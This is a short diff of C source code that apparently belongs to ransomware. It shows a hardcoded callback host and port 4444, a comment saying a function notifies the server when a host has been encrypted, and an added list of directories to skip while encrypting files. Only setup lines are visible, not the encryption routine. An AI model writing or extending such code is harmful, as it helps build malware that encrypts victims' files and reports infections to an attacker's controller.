@@ -3,7 +3,7 @@
 
 #define myhost "192.168.0.103"
 #define myport 4444
-
+char blacklist[][40] = {".", "..",".speech-dispatcher","X11"};
 struct dirent *getdir;
 
 //Funçao que avisa o servidor que algum host foi criptografado
